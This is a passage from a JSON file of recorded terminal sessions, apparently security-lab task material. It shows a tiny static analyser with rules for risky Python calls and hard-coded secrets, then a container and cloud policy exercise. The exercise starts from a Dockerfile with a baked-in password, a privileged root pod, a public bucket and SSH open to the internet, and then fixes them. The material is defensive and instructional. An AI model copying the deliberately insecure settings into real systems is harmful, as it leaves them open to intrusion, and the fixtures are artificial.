+     "o": "# A tiny static analyser: it reads the code as a syntax tree (it never runs it) and flags risky calls.\nimport ast, sys\nRISKY_CALLS = {\"eval\": \"runs any text as code\", \"exec\": \"runs any text as code\",\n               \"pickle.loads\": \"unpickling untrusted data can run code\", \"yaml.load\": \"use yaml.safe_load\",\n               \"hashlib.md5\": \"MD5 is broken for security uses\"}\ndef name_of(node):\n    if isinstance(node, ast.Name): return node.id\n    if isinstance(node, ast.Attribute): return f\"{name_of(node.value)}.{node.attr}\"\n    return \"\"\nclass Finder(ast.NodeVisitor):\n    def __init__(self): self.found = []\n    def visit_Call(self, node):\n        n = name_of(node.func)\n        if n in RISKY_CALLS: self.found.append((node.lineno, n, RISKY_CALLS[n]))\n        if n.startswith(\"subprocess.\") and any(k.arg == \"shell\" and getattr(k.value, \"value\", False) is True for k in node.keywords):\n            self.found.append((node.lineno, n, \"shell=True with built strings allows command injection\"))\n        if n.endswith(\".execute\") and node.args and isinstance(node.args[0], (ast.BinOp, ast.JoinedStr)):\n            self.found.append((node.lineno, n, \"SQL built from strings; use ? parameters\"))\n        self.generic_visit(node)\n    def visit_Assign(self, node):\n        for t in node.targets:\n            if isinstance(t, ast.Name) and any(w in t.id.lower() for w in (\"key\", \"secret\", \"password\", \"token\")) \\\n               and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):\n                self.found.append((node.lineno, t.id, \"hard-coded secret\"))\n        self.generic_visit(node)\nf = Finder(); f.visit(ast.parse(open(sys.argv[1]).read()))\nfor line, what, why in sorted(f.found): print(f\"{sys.argv[1]}:{line:<3} {what:18} {why}\")\nprint(len(f.found), \"findings\"); sys.exit(1 if f.found else 0)",
+     "x": 0
+    },
+    {
+     "c": "$ python3 sast.py app.py",
+     "o": "app.py:3   API_KEY            hard-coded secret\napp.py:6   subprocess.run     shell=True with built strings allows command injection\napp.py:9   db.execute         SQL built from strings; use ? parameters\napp.py:12  pickle.loads       unpickling untrusted data can run code\napp.py:15  yaml.load          use yaml.safe_load\napp.py:18  eval               runs any text as code\napp.py:21  hashlib.md5        MD5 is broken for security uses\n7 findings",
+     "x": 1
+    }
+   ],
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ bandit -q app.py -f custom --msg-template \"{line:<3} {severity:6} {test_id} {msg}\"",
+     "o": "1   LOW    B403 Consider possible security implications associated with pickle module.\n6   HIGH   B602 subprocess call with shell=True identified, security issue.\n9   MEDIUM B608 Possible SQL injection vector through string-based query construction.\n12  MEDIUM B301 Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.\n15  MEDIUM B506 Use of unsafe yaml load. Allows instantiation of arbitrary objects. Consider yaml.safe_load().\n18  MEDIUM B307 Use of possibly insecure function - consider using safer ast.literal_eval.\n21  HIGH   B324 Use of weak MD5 hash for security. Consider usedforsecurity=False",
+     "x": 1
+    }
+   ]
+  ],
+  "key": "a698162e21245fe0"
+ },
+ "secops-9": {
+  "blocks": [
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cd iac && cat Dockerfile pod.json plan.json",
+     "o": "FROM python:latest\nENV DB_PASSWORD=Winter2026!shop\nCOPY . /app\nRUN pip install -r /app/requirements.txt\nEXPOSE 22 8080\nCMD [\"python\", \"/app/main.py\"]\n{\"kind\": \"Pod\", \"metadata\": {\"name\": \"shop\"},\n \"spec\": {\"hostNetwork\": true, \"containers\": [{\"name\": \"web\", \"image\": \"shop:latest\",\n   \"securityContext\": {\"privileged\": true, \"runAsUser\": 0}}]}}\n{\"resource_changes\": [\n {\"address\": \"aws_s3_bucket_public_access_block.backups\", \"type\": \"aws_s3_bucket_public_access_block\",\n  \"change\": {\"after\": {\"block_public_acls\": false, \"restrict_public_buckets\": false}}},\n {\"address\": \"aws_security_group_rule.admin_ssh\", \"type\": \"aws_security_group_rule\",\n  \"change\": {\"after\": {\"type\": \"ingress\", \"from_port\": 22, \"to_port\": 22, \"cidr_blocks\": [\"0.0.0.0/0\"]}}},\n {\"address\": \"aws_db_instance.orders\", \"type\": \"aws_db_instance\",\n  \"change\": {\"after\": {\"storage_encrypted\": false, \"publicly_accessible\": false}}}]}",
+     "x": 0
+    }
+   ],
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cd iac && python3 ../policy.py",
+     "o": "CRIT pod.json:web                                  privileged container: root on the node if it is broken into\nCRIT aws_s3_bucket_public_access_block.backups     bucket can be made public\nHIGH Dockerfile                                    no USER line: the app runs as root\nHIGH Dockerfile:2                                  secret baked into the image; anyone with the image can read it\nHIGH pod.json                                      hostNetwork: the pod shares the node's network\nHIGH pod.json:web                                  may run as root; set runAsNonRoot: true\nHIGH aws_security_group_rule.admin_ssh             port 22 open to the whole internet\nMED  Dockerfile:1                                  base image not pinned (latest); pin a version or digest\nMED  Dockerfile:5                                  SSH port exposed; containers should not run sshd\nMED  pod.json:web                                  image tag latest\nMED  aws_db_instance.orders                        database storage not encrypted\nLOW  pod.json:web                                  no CPU/memory limits\n\n12 findings, 7 critical or high -> FAIL",
+     "x": 1
+    }
+   ],
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cd ~/lab/sec/iac",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > Dockerfile <<'DF'\n> FROM python:3.12.7-slim\n> COPY requirements.txt /app/\n> RUN pip install --no-cache-dir -r /app/requirements.txt && useradd --uid 10001 app\n> COPY . /app\n> USER 10001\n> EXPOSE 8080\n> CMD [\"python\", \"/app/main.py\"]\n> DF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > pod.json <<'JS'\n> {\"kind\": \"Pod\", \"metadata\": {\"name\": \"shop\"},\n>  \"spec\": {\"containers\": [{\"name\": \"web\", \"image\": \"shop:1.4.2\",\n>    \"resources\": {\"limits\": {\"cpu\": \"500m\", \"memory\": \"256Mi\"}},\n>    \"securityContext\": {\"runAsNonRoot\": true, \"allowPrivilegeEscalation\": false, \"readOnlyRootFilesystem\": true}}]}}\n> JS",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 - <<'PY'\n> import json\n> p = json.load(open(\"plan.json\"))\n> p[\"resource_changes\"][0][\"change\"][\"after\"] = {\"block_public_acls\": True, \"restrict_public_buckets\": True}\n> p[\"resource_changes\"][1][\"change\"][\"after\"][\"cidr_blocks\"] = [\"10.0.0.0/16\"]\n> json.dump(p, open(\"plan.json\", \"w\"))\n> PY",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 ../policy.py",
+     "o": "MED  aws_db_instance.orders                        database storage not encrypted\n\n1 findings, 0 critical or high -> PASS",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "ba840a71f943a244"
+ },
  "seniorqa-10": {
   "blocks": [
    [
